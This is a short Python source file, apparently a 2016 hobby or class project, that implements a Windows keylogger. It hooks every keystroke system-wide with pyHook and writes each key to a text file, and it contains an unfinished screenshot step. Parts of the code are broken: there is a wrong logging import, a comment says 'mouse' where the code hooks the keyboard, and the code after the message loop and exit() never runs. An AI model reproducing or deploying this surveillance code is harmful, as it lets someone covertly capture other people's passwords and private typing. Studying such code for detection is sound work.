#! python3
# T L Byers
#
from pip.utils import logging

__date__ = "4/26/2016"
'''*
DESCRIPTION: Keyboard logger presenting all data
*'''

#Modules and Functions Now is the time
import pythoncom, pyHook, time, datetime
from mss import mss



#all keypresses are recorded and stored in a
# text file created when the program is launched
file_log = "e:\\outputGroup4.txt"
startTime = (time.strftime("%d %b %Y %H:%M", time.gmtime()))


def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    logging.log(10,(event.Key))
    return True 

    # print('MessageName:',event.MessageName)
    # # print('Message:',event.Message)
    # # print('Time:',event.Time)
    # # print('Window:',event.Window)
    # # print('WindowName:',event.WindowName)
    # # print('Ascii:', event.Ascii, chr(event.Ascii))
    # # print('Key:', event.Key)
    # # print('KeyID:', event.KeyID)
    # # print('ScanCode:', event.ScanCode)
    # # print('Extended:', event.Extended)
    # # print('Injected:', event.Injected)
    # # print('Alt', event.Alt)
    # # print('Transition', event.Transition)
    # # print('---')

    return True

# create a hook manager
hm = pyHook.HookManager()
# watch for all mouse events
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()

ts = time.time()

timeStamp = datetime.datetime.fromtimestamp(ts).\
    strftime("%Y-%m-%d %H%M:%S")
print(timeStamp)
myFile = open(("my" + timeStamp), "w")
myFile.close()
exit("\nFile Timestamped ")
#takes a screenshot of monitor when prompted
with mss() as sct:

    sct.shot()
    sct.save()
    print(myFile)
